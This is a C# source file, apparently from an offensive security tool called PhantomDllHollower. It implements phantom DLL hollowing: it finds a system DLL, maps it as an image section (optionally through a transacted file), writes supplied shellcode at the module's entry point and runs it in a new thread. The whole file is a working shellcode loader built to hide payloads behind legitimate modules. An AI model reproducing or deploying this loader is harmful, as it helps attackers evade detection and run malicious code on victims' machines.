using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using PhantomDllHollower.Interop;

namespace PhantomDllHollower.Library
{
    using NTSTATUS = Int32;
    using SIZE_T = UIntPtr;

    internal class Modules
    {
        public static bool PhantomShellcodeLoad(byte[] shellcode, bool txf)
        {
            NTSTATUS ntstatus;
            byte[] payload;
            IntPtr pShellcode;
            string targetModulePath;
            uint nEntryPointOffset;
            var status = false;
            var hPayloadSection = Win32Consts.INVALID_HANDLE_VALUE;
            var pSectionBaseAddress = IntPtr.Zero;
            var hShellcodeThread = IntPtr.Zero;
            var nViewSize = SIZE_T.Zero;
            var addressFormat = Environment.Is64BitProcess ? "X16" : "X8";

            Console.WriteLine(@"[>] Searching target module file from {0}.", Environment.SystemDirectory);

            if (txf)
                Console.WriteLine("    [*] TxF mode is enabled. This mode requires administrative privilege.");

            targetModulePath = Utilities.FindTargetModulePath((uint)shellcode.Length, txf);

            if (string.IsNullOrEmpty(targetModulePath))
            {
                Console.WriteLine("[-] Failed to find abusable module. You may not have sufficient privileges.");

                return false;
            }
            else
            {
                Console.WriteLine("[+] Got target module path.");
                Console.WriteLine("    [*] Target : {0}", targetModulePath);
            }

            do
            {
                if (txf)
                {
                    Console.WriteLine("[>] Trying to generate payload data.");

                    payload = Utilities.WriteShellcodeIntoModuleData(targetModulePath, shellcode, out nEntryPointOffset);

                    if (payload.Length == 0)
                    {
                        Console.WriteLine("[-] Failed to generate payload data.");
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[+] Payload data is generated successfully.");
                    }

                    Console.WriteLine("[>] Trying to create section object for payload.");

                    hPayloadSection = Utilities.CreateTransactedSection(targetModulePath, payload);

                    if (hPayloadSection == Win32Consts.INVALID_HANDLE_VALUE)
                    {
                        Console.WriteLine("[-] Failed to create payload section object.");
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[+] Payload section object is created successfully.");
                        Console.WriteLine("    [*] Section Handle : 0x{0}", hPayloadSection.ToString("X"));
                    }

                    Console.WriteLine("[>] Trying to map payload section.");

                    ntstatus = NativeMethods.NtMapViewOfSection(
                        hPayloadSection,
                        Process.GetCurrentProcess().Handle,
                        ref pSectionBaseAddress,
                        SIZE_T.Zero,
                        SIZE_T.Zero,
                        IntPtr.Zero,
                        ref nViewSize,
                        SECTION_INHERIT.ViewShare,
                        0,
                        MEMORY_PROTECTION.READONLY);

                    if ((ntstatus != Win32Consts.STATUS_SUCCESS) &&
                        (ntstatus != Win32Consts.STATUS_IMAGE_NOT_AT_BASE))
                    {
                        Console.WriteLine("[-] Failed to map payload section.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    }
                    else
                    {
                        if (Environment.Is64BitProcess)
                            pShellcode = new IntPtr(pSectionBaseAddress.ToInt64() + nEntryPointOffset);
                        else
                            pShellcode = new IntPtr(pSectionBaseAddress.ToInt32() + (int)nEntryPointOffset);

                        Console.WriteLine("[+] Payload Section is mapped at 0x{0}.", pSectionBaseAddress.ToString(addressFormat));
                        Console.WriteLine("    [*] Shellcode @ 0x{0}", pShellcode.ToString(addressFormat));
                        Console.WriteLine("[>] Executing your shellcode.");

                        ntstatus = NativeMethods.NtCreateThreadEx(
                            out hShellcodeThread,
                            ACCESS_MASK.THREAD_ALL_ACCESS,
                            IntPtr.Zero,
                            Process.GetCurrentProcess().Handle,
                            pShellcode,
                            IntPtr.Zero,
                            false,
                            0,
                            0,
                            0,
                            IntPtr.Zero);

                        if (ntstatus != Win32Consts.STATUS_SUCCESS)
                        {
                            Console.WriteLine("[-] Failed to create shellcode thread.");
                            Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                            hShellcodeThread = IntPtr.Zero;
                        }
                        else
                        {
                            Console.WriteLine("[+] Shellcode thread is created successfully.");
                            status = true;
                        }
                    }
                }
                else
                {
                    using (var pe = new PeFile(targetModulePath))
                    {
                        nEntryPointOffset = pe.GetAddressOfEntryPoint();
                    }

                    Console.WriteLine("[>] Trying to create section object for payload.");

                    hPayloadSection = Utilities.CreateImageSection(targetModulePath);

                    if (hPayloadSection == Win32Consts.INVALID_HANDLE_VALUE)
                    {
                        Console.WriteLine("[-] Failed to create payload section object.");
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[+] Payload section object is created successfully.");
                        Console.WriteLine("    [*] Section Handle : 0x{0}", hPayloadSection.ToString("X"));
                    }

                    Console.WriteLine("[>] Trying to map payload section.");

                    ntstatus = NativeMethods.NtMapViewOfSection(
                        hPayloadSection,
                        Process.GetCurrentProcess().Handle,
                        ref pSectionBaseAddress,
                        SIZE_T.Zero,
                        SIZE_T.Zero,
                        IntPtr.Zero,
                        ref nViewSize,
                        SECTION_INHERIT.ViewShare,
                        0,
                        MEMORY_PROTECTION.READONLY);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    {
                        Console.WriteLine("[-] Failed to map payload section.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[+] Payload Section is mapped at 0x{0}.", pSectionBaseAddress.ToString(addressFormat));
                    }

                    if (Environment.Is64BitProcess)
                        pShellcode = new IntPtr(pSectionBaseAddress.ToInt64() + nEntryPointOffset);
                    else
                        pShellcode = new IntPtr(pSectionBaseAddress.ToInt32() + (int)nEntryPointOffset);

                    Console.WriteLine("[>] Trying to write shellcode to payload section's entry point.");
                    Console.WriteLine("    [*] Entry Point @ 0x{0}", pShellcode.ToString(addressFormat));

                    ntstatus = Helpers.WriteShellcode(Process.GetCurrentProcess().Handle, pShellcode, shellcode);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    {
                        Console.WriteLine("[-] Failed to write shellcode.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[+] Shellcode is written successfully.");
                    }

                    Console.WriteLine("[>] Executing your shellcode.");

                    ntstatus = NativeMethods.NtCreateThreadEx(
                        out hShellcodeThread,
                        ACCESS_MASK.THREAD_ALL_ACCESS,
                        IntPtr.Zero,
                        Process.GetCurrentProcess().Handle,
                        pShellcode,
                        IntPtr.Zero,
                        false,
                        0,
                        0,
                        0,
                        IntPtr.Zero);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    {
                        Console.WriteLine("[-] Failed to create shellcode thread.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                        hShellcodeThread = IntPtr.Zero;
                    }
                    else
                    {
                        Console.WriteLine("[+] Shellcode thread is created successfully.");
                        status = true;
                    }
                }
            } while (false);

            if (hPayloadSection != Win32Consts.INVALID_HANDLE_VALUE)
                NativeMethods.NtClose(hPayloadSection);

            if (hShellcodeThread != IntPtr.Zero)
            {
                Console.WriteLine("[*] Waiting for shellcode thread exit.");

                NativeMethods.NtWaitForSingleObject(hShellcodeThread, BOOLEAN.TRUE, IntPtr.Zero);
                NativeMethods.NtClose(hShellcodeThread);
            }

            Console.WriteLine("[*] Done.");

            return status;
        }
    }
}
